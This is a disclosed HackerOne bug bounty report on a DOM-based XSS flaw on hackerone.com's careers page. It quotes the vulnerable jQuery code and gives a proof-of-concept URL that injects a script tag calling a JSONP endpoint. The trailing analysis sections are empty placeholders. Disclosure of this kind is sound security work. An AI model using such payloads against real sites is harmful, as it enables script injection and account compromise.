---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '474656'
original_report_id: '474656'
title: Cross-site Scripting (XSS) on HackerOne careers page
weakness: Cross-site Scripting (XSS) - DOM
team_handle: security
created_at: '2019-01-04T13:49:31.861Z'
disclosed_at: '2019-02-17T23:18:46.382Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 226
asset_identifier: www.hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# Cross-site Scripting (XSS) on HackerOne careers page

## Metadata

- HackerOne Report ID: 474656
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: security
- Disclosed At: 2019-02-17T23:18:46.382Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Dear HackerOne team,
**Summary:**
I found DOM XSS at endpoint `https://www.hackerone.com/careers`, but can not bypass CSP. It's work on IE and Edge.

### Steps To Reproduce
- JS file is "Masonry js file", vulnerability code:

```javascript
//Checking for potential Lever source or origin parameters
var pageUrl = window.location.href;
var leverParameter = '';
var trackingPrefix = '?lever-'

if( pageUrl.indexOf(trackingPrefix) >= 0){
  // Found Lever parameter
  var pageUrlSplit = pageUrl.split(trackingPrefix);
  leverParameter = '?lever-'+pageUrlSplit[1];
}
```
```javascript
 var link = posting.hostedUrl+leverParameter;
    
    	jQuery('#jobs-container .jobs-list').append(
      '<div class="job '+teamCleanString+' '+locationCleanString.replace(',', '')+' '+commitmentCleanString+'">' +
        '<a class="job-title" href="'+link+'"">'+title+'</a>' +
        '<p class="tags"><span>'+team+'</span><span>'+location+'</span><span>'+commitment+'</span></p>' +
        '<p class="description">'+shortDescription+'</p>' +
        '<a class="btn" href="'+link+'">Learn more</a>' +
      '</div>'  
    
      );
```
-  `link` variable is append by jquery.
- POC: `https://www.hackerone.com/careers?lever-#aaa"><script src="https://app-sj17.marketo.com/index.php/form/getForm?callback=alert"></script>`

### Optional: Your Environment (Browser version, Device, etc)

 * IE, Edge (because url is encoded on firefox and chrome)

### Optional: Supporting Material/References (Screenshots)
 {F400895}
{F400896}

## Impact

* XSS but can not bypass CSP
* inject html code

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
